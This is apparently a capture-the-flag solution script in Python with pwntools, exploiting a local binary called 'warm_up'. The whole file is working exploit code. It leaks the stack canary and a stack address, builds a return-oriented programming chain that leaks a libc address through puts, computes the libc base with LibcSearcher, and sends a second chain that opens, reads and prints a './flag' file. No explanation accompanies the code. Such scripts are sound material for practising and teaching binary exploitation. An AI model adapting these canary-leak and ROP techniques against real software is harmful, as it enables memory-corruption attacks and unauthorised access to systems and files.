from pwn import*
from LibcSearcher import *
context.log_level = 'debug'

p = process('warm_up')
elf = ELF('warm_up')
p.sendlineafter('warm up!!!','U'*0x17 + 'H')
p.recvuntil('H',drop = True)
canary = u64(p.recv(8).replace('\x0A','\x00').ljust(8,'\x00'))
stack = u64(p.recv(6).ljust(8,'\x00'))
log.success('Canary:\t' + hex(canary))
log.success('Stack:\t' + hex(stack))

puts_plt = elf.plt['puts']
start_main = elf.got['__libc_start_main']
pop_rdi_ret = 0x400BC3
main_addr = 0x400B30
##leak the real address
p.recvrepeat(0.5)
payload_I = 'U'*0x18 + p64(canary) + p64(stack) + p64(pop_rdi_ret) + p64(start_main) + p64(puts_plt) + p64(main_addr)
p.sendline(payload_I)
start_main_addr = u64(p.recv(6).ljust(8,'\x00'))
libc = LibcSearcher('__libc_start_main',start_main_addr)
log.success('Start_Main:\t' + hex(start_main_addr))
libcbase = start_main_addr - libc.dump('__libc_start_main')

pdi=0x21102+libcbase #pop rdi;ret;
psi=0x202E8+libcbase #pop rsi;ret;
pdx=0x01B92+libcbase #pop rdx;ret;
write_got = libcbase + libc.dump('write')
open_got = libcbase + libc.dump('open')
read_got = libcbase + libc.dump('read')

fake=stack-0x20 #sub offset;fake point the rsp
log.success('Fake:\t'+hex(fake))
p.sendlineafter('warm up!!!','U')
p.recvuntil(' ?')
payload_II='./flag\x00\x00'+'U'*0x10+p64(canary)*2
payload_II+=p64(pdi)+p64(fake)+p64(psi)+p64(0)+p64(pdx)+p64(0)+p64(open_got)
payload_II+=p64(pdi)+p64(3)+p64(psi)+p64(elf.bss()+0x100)+p64(pdx)+p64(0x100)+p64(read_got)
payload_II+=p64(pdi)+p64(1)+p64(psi)+p64(elf.bss()+0x100)+p64(pdx)+p64(0x100)+p64(write_got)
p.sendline(payload_II)
p.interactive()
